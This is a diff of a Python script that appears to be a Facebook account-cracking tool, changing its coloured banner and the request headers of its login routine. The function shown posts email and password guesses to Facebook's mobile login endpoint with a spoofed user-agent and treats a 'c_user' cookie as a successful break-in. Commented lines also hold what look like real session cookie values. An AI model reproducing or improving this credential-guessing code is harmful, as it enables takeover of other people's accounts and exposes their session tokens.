@@ -221,12 +221,12 @@ def _PARVEJ_(u):
 #------------------[ LOGO-LAKNAT ]-----------------#
 def banner():
 	print(f"""\033[1;32m
-d8888b.  .d8b.  d8888b. db    db d88888b    d88b 
-88  `8D d8' `8b 88  `8D 88    88 88'        `8P' 
-88oodD' 88ooo88 88oobY' Y8    8P 88ooooo     88  
-88~~~   88~~~88 88`8b   `8b  d8' 88~~~~~     88  
-88      88   88 88 `88.  `8bd8'  88.     db. 88  
-88      YP   YP 88   YD    YP    Y88888P Y8888P  
+\033[0;30md8888b.  .d8b.  d8888b. db    db d88888b    d88b 
+\033[0;30m88  `8D d8' `8b 88  `8D 88    88 88'        `8P' 
+\033[0;33m88oodD' 88ooo88 88oobY' Y8    8P 88ooooo     88  
+\033[0;33m88~~~   88~~~88 88`8b   `8b  d8' 88~~~~~     88  
+\033[0;32m88      88   88 88 `88.  `8bd8'  88.     db. 88  
+\033[0;32m88      YP   YP 88   YD    YP    Y88888P Y8888P  
                    
 \033[1;91m--------------------------------------------
 \033[1;91m[*] CREATOR   > PARVEJ
@@ -606,22 +606,23 @@ def PARVEJ(uid,pwv,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {"authority": 'mbasic.facebook.com',
-            'method': 'GET',
-            'scheme': 'https', 
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-language': 'en-BD,en;q=0.9,bn-BD;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-            'cache-control': 'max-age=0',
-            # 'cookie': 'datr=fBUAZGGo-zMzoZjvnOPMeaNz; sb=fBUAZGpDUevpF5cTHSS8f8v7; zsh=ASQEMcVxs1Zu4umLrmv5bi5cdHTvtE6cX5t1nR70Zx6TTzg42yQdiyV5yQaeiFC-Yc9w5_n2IyawhKuazcDFoQ-I4ME-3rqn62nPOIm211zbCUljOP-p6BME9mqEd0JnSW0DsyQTS2O-MyMpMrD6oKDgKf6B-eOe85tMxbq_i30PVJOcwti4BNGvn0Hj2DoycBje20B0gy6Q6Ctbki4vogOKtmkDnBGoru_-LKLx9kF-STlYrv2Oo-IHKgnIaGJXOOixrXv0icu-Y1e-XogPkMzzdy1n6_I6_qA2jxZhiMwT2hCZG4FBFjAJZ_AmSTjgy47Vy0Lks2E9bV8-; m_pixel_ratio=2; wd=360x806; fr=0bqgIuM91Owb0Yk1O..BkABV8.W2.AAA.0.0.BkAf8X.AWWVwHU9NPA',
-            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="111", "Opera";v="96"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent':pro}
+            header_freefb = {
+    'authority': 'free.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+    'cache-control': 'no-cache',
+    # 'cookie': 'datr=E74nZPAr1N4lHnO5Z23vj8-3; sb=E74nZEslp3CcUIIi8Pt81iCR; m_pixel_ratio=1.75; wd=412x805; fr=0qe97yfeoNUBkUDS1..BkJ74b.MC.AAA.0.0.BkJ9mp.AWVdVKakVyQ',
+    'pragma': 'no-cache',
+    'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
+}
             lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
